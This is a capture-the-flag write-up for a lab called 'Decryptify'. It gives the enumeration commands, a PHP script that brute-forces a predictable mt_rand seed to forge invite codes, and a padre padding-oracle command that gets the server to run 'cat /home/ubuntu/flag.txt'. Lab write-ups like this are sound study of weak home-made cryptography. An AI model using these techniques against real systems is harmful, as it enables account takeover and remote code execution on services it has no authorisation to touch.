# Decryptify

Use your exploitation skills to uncover encrypted keys and get RCE.

### Objectives

- What is the flag value after logging into the panel?
- What is the content of the `/home/ubuntu/flag.txt` file?

---

## Initial Recon

```bash
gobuster dir -w raft-medium-words.txt -u http://10.81.186.222:1337/ -x txt,php
```

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.81.186.222:1337/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/.html.txt            (Status: 403) [Size: 280]
/.html.php            (Status: 403) [Size: 280]
/js                   (Status: 301) [Size: 318] [--> http://10.81.186.222:1337/js/]
/index.php            (Status: 200) [Size: 3220]
/css                  (Status: 301) [Size: 319] [--> http://10.81.186.222:1337/css/]
/.htm                 (Status: 403) [Size: 280]
/.htm.php             (Status: 403) [Size: 280]
/.htm.txt             (Status: 403) [Size: 280]
/logs                 (Status: 301) [Size: 320] [--> http://10.81.186.222:1337/logs/]
/api.php              (Status: 200) [Size: 1043]
/javascript           (Status: 301) [Size: 326] [--> http://10.81.186.222:1337/javascript/]
/header.php           (Status: 200) [Size: 370]
/footer.php           (Status: 200) [Size: 245]
```

## Log File Discovery

Browsing to `http://10.81.186.222:1337/logs/app.log` revealed an exposed application log:

```
2025-01-23 14:32:56 - User POST to /index.php (Login attempt)
2025-01-23 14:33:01 - User POST to /index.php (Login attempt)
2025-01-23 14:33:05 - User GET /index.php (Login page access)
2025-01-23 14:33:15 - User POST to /index.php (Login attempt)
2025-01-23 14:34:20 - User POST to /index.php (Invite created, code: MTM0ODMzNzEyMg== for alpha@fake.thm)
2025-01-23 14:35:25 - User GET /index.php (Login page access)
2025-01-23 14:36:30 - User POST to /dashboard.php (User alpha@fake.thm deactivated)
2025-01-23 14:37:35 - User GET /login.php (Page not found)
2025-01-23 14:38:40 - User POST to /dashboard.php (New user created: hello@fake.thm)
```

Key takeaways from the log:
- A known invite code exists for `alpha@fake.thm`: `MTM0ODMzNzEyMg==`
- A newer, unused account was created: `hello@fake.thm` — but we don't have its invite code yet.

## Exploiting the API

I asked an AI what the output of `/js/api.js` was and got back the string **`H7gY2tJ9wQzD4rS1`**. Using this against `api.php` revealed the next part of the puzzle — the invite code generation logic:

```php
This function generates an invite_code against a user email.

// Token generation example
function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    $seed_value = hexdec($email_length + $constant_value + $email_hex);

    return $seed_value;
}

$seed_value = calculate_seed_value($email, $constant_value);
mt_srand($seed_value);
$random = mt_rand();
$invite_code = base64_encode($random);
```

The goal now was to recover the invite code for the email found earlier: **`hello@fake.thm`**.

### Brute-Forcing the Constant

Since we already know the invite code for `alpha@fake.thm`, we can brute-force the unknown `$constant_value` by testing values until the generated code matches the known one — then reuse that constant to generate the code for `hello@fake.thm`.

I asked an AI to write a script to automate this:

```php
<?php

function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    $seed_value = hexdec($email_length + $constant_value + $email_hex);
    return $seed_value;
}

function generate_invite($email, $constant_value) {
    $seed_value = calculate_seed_value($email, $constant_value);
    mt_srand($seed_value);
    $random = mt_rand();
    return base64_encode($random);
}

// Known values from log
$known_email = "alpha@fake.thm";
$known_code = "MTM0ODMzNzEyMg==";
$target_email = "hello@fake.thm";

// Find constant
echo "Finding constant...\n";
for ($const = 0; $const <= 1000000; $const++) {
    if (generate_invite($known_email, $const) === $known_code) {
        echo "Found constant: " . $const . "\n";
        echo "Invite for " . $target_email . ": " . generate_invite($target_email, $const) . "\n";
        break;
    }
}

?>
```

This produced the invite code **`NDYxNTg5ODkx`**. Logging into the panel with it gave the first flag:

**Flag:** `THM{Cryptography######007}`

---

## Finding the Padding Oracle

Looking at the dashboard page source, I noticed a hidden `GET` parameter:

```html
<form method="get">
    <input type="hidden" name="date" value="BP21EuuN2Kb/dkLwTfw8cnyph+LXQPC9AwUwKffy2q8=">
```

Adding this to the URL as `dashboard.php?date=test` produced the following error:

```
Padding error: error:0606506D:digital envelope routines:EVP_DecryptFinal_ex:wrong final block length
```

This confirmed the `date` parameter was vulnerable to a **padding oracle attack**.

## Exploiting with PadRE

After some research, I found a tool called **padre** designed for exploiting exactly this kind of padding oracle:

```bash
padre -u 'http://10.81.186.222:1337/dashboard.php?date=$' \
  -cookie 'PHPSESSID=2rctv2qoabtjnev3qbhj5bar28; role=d057af5933d8acebfe290fe2bbd540e08a2a81a22eff55969a89a7dbe84fb98cd6cbda066ed79220eba70afb9b3d4e0d' \
  -enc 'cat /home/ubuntu/flag.txt'
```

This returned the encrypted ciphertext:

```
8PbYmhBRYImG2Z1AD5q49ynzYe9uXhItTm5ukoLcAaBlYWViemdiZw==
```

Passing this value back into the `date` GET parameter caused the server to decrypt and execute it, returning the contents of the flag file:

**Final Flag:** `THM{GOT_COMMAND_EXE######001}`

---

## Summary

- **Recon:** Gobuster uncovered an exposed `/logs/` directory and several PHP endpoints (`index.php`, `api.php`, `dashboard.php`).
- **Info leak:** `app.log` exposed a valid invite code for one user (`alpha@fake.thm`) and revealed a second, uninvited account (`hello@fake.thm`).
- **Weak invite generation:** The invite code was derived from a predictable seed (`email length + constant + partial email hash`) fed into PHP's `mt_rand()`. Since the seed's only unknown was a small constant, it could be brute-forced using the known invite code, then reused to forge a valid invite for the target account (flag #1).
- **Padding oracle:** The `dashboard.php?date=` parameter leaked verbose OpenSSL padding errors, indicating a **CBC padding oracle** vulnerability.
- **Exploitation via PadRE:** Used the `padre` tool to abuse the padding oracle, encrypting arbitrary commands (like `cat /home/ubuntu/flag.txt`) and getting the server to execute and return the result — achieving remote code execution (final flag).

**Key takeaways:** the challenge hinged on two classic crypto implementation flaws — a predictable PRNG seed for invite tokens, and a padding oracle in a custom encryption/decryption scheme — showing how weak "home-rolled" cryptography can lead directly to account takeover and RCE.
